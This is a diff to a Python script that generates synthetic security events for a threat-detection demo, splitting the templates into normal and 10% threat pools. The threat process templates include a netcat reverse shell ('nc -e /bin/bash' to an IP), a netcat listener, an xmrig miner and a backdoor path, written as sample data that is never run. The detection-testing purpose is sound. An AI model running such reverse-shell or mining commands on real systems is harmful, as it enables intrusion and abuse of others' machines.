@@ -40,31 +40,68 @@ DEMO_AGENTS = [
     {"machine_id": "demo-workstation-03", "users": ["jordan", "marcus", "dev"]},
 ]
 
-AUTH_TEMPLATES = [
-    {"action": "login", "service": "sshd", "success": True},
-    {"action": "login", "service": "sshd", "success": True},
-    {"action": "login", "service": "sudo", "success": True},
-    {"action": "failure", "service": "sshd", "success": False},
-    {"action": "failure", "service": "sshd", "success": False},
+# ---------------------------------------------------------------------------
+# Templates split into NORMAL (90%) and THREAT (10%) pools
+#
+# Normal events are crafted to produce low threat-index scores:
+#   - Auth:    only successful login/logout (no failures)
+#   - Command: very short lengths (cmd_len feature stays near 0), random hashes
+#   - Process: only well-known system binaries with benign argv
+# ---------------------------------------------------------------------------
+
+NORMAL_AUTH = [
+    {"action": "login",  "service": "sshd",  "success": True},
+    {"action": "login",  "service": "sudo",  "success": True},
+    {"action": "login",  "service": "pam",   "success": True},
+    {"action": "logout", "service": "sshd",  "success": True},
+    {"action": "logout", "service": "sudo",  "success": True},
+    {"action": "logout", "service": "pam",   "success": True},
 ]
 
-COMMAND_TEMPLATES = [
-    {"command_hash": None, "command_length": 10},   # filled with random hash
-    {"command_hash": None, "command_length": 45},
-    {"command_hash": None, "command_length": 120},
-    {"command_hash": THREAT_HASH_1, "command_length": 8},   # known malicious
-    {"command_hash": THREAT_HASH_2, "command_length": 12},
+THREAT_AUTH = [
+    {"action": "failure", "service": "sshd",  "success": False},
+    {"action": "failure", "service": "sudo",  "success": False},
+    {"action": "failure", "service": "pam",   "success": False},
+    {"action": "failure", "service": "sshd",  "success": False},  # brute-force weight
 ]
 
-PROCESS_TEMPLATES = [
-    {"pid": 1000, "exe": "/usr/bin/bash", "argv": ["bash"], "parent_pid": 1, "start_time": None},
+# Short command lengths keep cmd_len feature (÷500) close to 0 → low risk score
+NORMAL_COMMAND = [
+    {"command_hash": None, "command_length": 5},
+    {"command_hash": None, "command_length": 8},
+    {"command_hash": None, "command_length": 12},
+    {"command_hash": None, "command_length": 18},
+    {"command_hash": None, "command_length": 25},
+    {"command_hash": None, "command_length": 30},
+]
+
+THREAT_COMMAND = [
+    {"command_hash": THREAT_HASH_1, "command_length": 8},    # PSI-matched malicious hash
+    {"command_hash": THREAT_HASH_2, "command_length": 12},   # PSI-matched reverse shell
+    {"command_hash": None, "command_length": 512},           # suspiciously long command
+    {"command_hash": None, "command_length": 1024},          # obfuscated/encoded payload
+]
+
+NORMAL_PROCESS = [
+    {"pid": 1000, "exe": "/usr/bin/bash",    "argv": ["bash"],                        "parent_pid": 1,    "start_time": None},
     {"pid": 1001, "exe": "/usr/bin/python3", "argv": ["python3", "-m", "agent.main"], "parent_pid": 1000, "start_time": None},
-    {"pid": 1002, "exe": "/usr/bin/git", "argv": ["git", "pull"], "parent_pid": 1000, "start_time": None},
-    {"pid": 2001, "exe": "/usr/bin/nc", "argv": ["nc", "-l", "-p", "4444"], "parent_pid": 1000, "start_time": None},
-    {"pid": 2002, "exe": "/tmp/crypto_miner.sh", "argv": ["/tmp/crypto_miner.sh"], "parent_pid": 1001, "start_time": None},
-    {"pid": 2003, "exe": "/usr/bin/nc", "argv": ["nc", "-e", "/bin/bash", "192.168.1.1", "4444"], "parent_pid": 1000, "start_time": None},
-    {"pid": 2004, "exe": "/var/tmp/xmrig", "argv": ["/var/tmp/xmrig", "-o", "pool.example.com"], "parent_pid": 1000, "start_time": None},
+    {"pid": 1002, "exe": "/usr/bin/git",     "argv": ["git", "pull"],                 "parent_pid": 1000, "start_time": None},
+    {"pid": 1003, "exe": "/usr/bin/ls",      "argv": ["ls", "-la"],                   "parent_pid": 1000, "start_time": None},
+    {"pid": 1004, "exe": "/usr/bin/curl",    "argv": ["curl", "https://example.com"], "parent_pid": 1000, "start_time": None},
+    {"pid": 1005, "exe": "/usr/bin/systemd", "argv": ["systemd", "--user"],           "parent_pid": 1,    "start_time": None},
+    {"pid": 1006, "exe": "/usr/bin/vim",     "argv": ["vim", "config.yaml"],          "parent_pid": 1000, "start_time": None},
+    {"pid": 1007, "exe": "/usr/bin/ssh",     "argv": ["ssh", "deploy@prod"],          "parent_pid": 1000, "start_time": None},
 ]
+
+THREAT_PROCESS = [
+    {"pid": 2001, "exe": "/usr/bin/nc",          "argv": ["nc", "-l", "-p", "4444"],                       "parent_pid": 1000, "start_time": None},
+    {"pid": 2002, "exe": "/tmp/crypto_miner.sh", "argv": ["/tmp/crypto_miner.sh"],                         "parent_pid": 1001, "start_time": None},
+    {"pid": 2003, "exe": "/usr/bin/nc",          "argv": ["nc", "-e", "/bin/bash", "192.168.1.1", "4444"], "parent_pid": 1000, "start_time": None},
+    {"pid": 2004, "exe": "/var/tmp/xmrig",       "argv": ["/var/tmp/xmrig", "-o", "pool.example.com"],     "parent_pid": 1000, "start_time": None},
+    {"pid": 2005, "exe": "/tmp/backdoor",        "argv": ["/tmp/backdoor"],                                "parent_pid": 1,    "start_time": None},
+]
+
+ANOMALY_RATE = 0.10  # 10% threat events, 90% normal
 
 
 def random_hex_hash(prefix: str = "") -> str:
@@ -100,6 +137,12 @@ def build_event(machine_id: str, user: str, source: str, payload: dict) -> dict:
     }
 
 
+def pick(normal_pool: list, threat_pool: list) -> dict:
+    """Return a copy from the threat pool 10% of the time, normal pool 90%."""
+    pool = threat_pool if random.random() < ANOMALY_RATE else normal_pool
+    return dict(random.choice(pool))
+
+
 def generate_batch() -> list[dict]:
     events = []
     for agent in DEMO_AGENTS:
@@ -109,15 +152,15 @@ def generate_batch() -> list[dict]:
         for _ in range(n):
             kind = random.choice(["auth", "command", "process"])
             if kind == "auth":
-                pl = dict(random.choice(AUTH_TEMPLATES))
+                pl = pick(NORMAL_AUTH, THREAT_AUTH)
             elif kind == "command":
-                t = random.choice(COMMAND_TEMPLATES)
+                t = pick(NORMAL_COMMAND, THREAT_COMMAND)
                 pl = {
                     "command_hash": t["command_hash"] or random_hex_hash()[:64],
                     "command_length": t["command_length"],
                 }
             else:
-                t = dict(random.choice(PROCESS_TEMPLATES))
+                t = pick(NORMAL_PROCESS, THREAT_PROCESS)
                 t["start_time"] = time.time() - random.randint(0, 3600)
                 pl = t
             events.append(build_event(machine_id, user, kind, pl))
@@ -141,6 +184,7 @@ def send_batch(events: list[dict]) -> bool:
 def main() -> None:
     print(f"Demo agents → {EVENTS_ENDPOINT}")
     print("Agents:", [a["machine_id"] for a in DEMO_AGENTS])
+    print(f"Mix: {int((1 - ANOMALY_RATE) * 100)}% normal (low threat index) / {int(ANOMALY_RATE * 100)}% threat events")
     print("Press Ctrl+C to stop.\n")
     ensure_threat_hashes()
     sent = 0
